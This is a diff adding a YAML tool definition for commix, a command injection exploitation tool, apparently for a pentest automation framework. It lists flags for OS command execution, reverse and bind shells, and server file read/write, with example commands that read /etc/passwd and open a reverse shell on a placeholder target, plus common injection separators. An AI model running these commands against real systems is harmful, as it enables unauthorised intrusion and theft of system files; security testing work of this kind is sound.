@@ -1,0 +1,140 @@
+name: commix
+category: web
+description: Automated command injection and exploitation tool.
+keywords:
+  - command
+  - injection
+  - os
+  - rce
+  - shell
+  - exploit
+
+parameters:
+  url:
+    type: string
+    required: true
+    flag: "-u"
+    description: Target URL with injectable parameter
+
+  data:
+    type: string
+    flag: "--data"
+    description: POST data
+
+  cookie:
+    type: string
+    flag: "--cookie"
+    description: HTTP Cookie header
+
+  level:
+    type: integer
+    flag: "--level"
+    default: 1
+    description: "Level of tests (1-3)"
+
+  technique:
+    type: string
+    flag: "--technique"
+    description: "Injection technique (c=classic, e=eval, t=time, f=file)"
+
+  os:
+    type: enum
+    flag: "--os"
+    options: ["unix", "windows"]
+    description: Target OS
+
+  shell:
+    type: boolean
+    flag: "--os-cmd"
+    description: Execute OS command
+
+  reverse_shell:
+    type: boolean
+    flag: "--reverse-shell"
+    description: Get reverse shell
+
+  bind_shell:
+    type: boolean
+    flag: "--bind-shell"
+    description: Get bind shell
+
+  file_read:
+    type: string
+    flag: "--file-read"
+    description: Read file from server
+
+  file_write:
+    type: string
+    flag: "--file-write"
+    description: Write file to server
+
+  file_dest:
+    type: string
+    flag: "--file-dest"
+    description: Destination path for file write
+
+  skip_calc:
+    type: boolean
+    flag: "--skip-calc"
+    description: Skip mathematical calculation check
+
+  skip_empty:
+    type: boolean
+    flag: "--skip-empty"
+    description: Skip empty injection test
+
+  batch:
+    type: boolean
+    flag: "--batch"
+    description: Non-interactive mode
+
+  output_dir:
+    type: string
+    flag: "--output-dir"
+    description: Output directory
+
+  verbose:
+    type: boolean
+    flag: "-v"
+    description: Verbose output
+
+  proxy:
+    type: string
+    flag: "--proxy"
+    description: Proxy URL
+
+requires_root: false
+timeout: 300
+
+examples:
+  - "commix -u 'http://target.com/page?cmd=test' --batch"
+  - "commix -u 'http://target.com/page' --data='input=test' --batch"
+  - "commix -u 'http://target.com/page?cmd=test' --os-cmd"
+  - "commix -u 'http://target.com/page?cmd=test' --file-read=/etc/passwd"
+  - "commix -u 'http://target.com/page?cmd=test' --reverse-shell"
+
+notes: |
+  Injection techniques:
+  - c (classic): Direct command execution
+  - e (eval-based): PHP/Python eval injection
+  - t (time-based): Blind time-based
+  - f (file-based): Write to temp file
+
+  Common vulnerable parameters:
+  - cmd, command, exec, execute
+  - ping, ip, host, hostname
+  - path, file, filename
+  - input, search, query
+
+  Payloads tested:
+  - ; command
+  - | command
+  - & command
+  - `command`
+  - $(command)
+  - And many more encodings
+
+  Shell types:
+  - --os-cmd: Single command
+  - --reverse-shell: Reverse shell
+  - --bind-shell: Bind shell
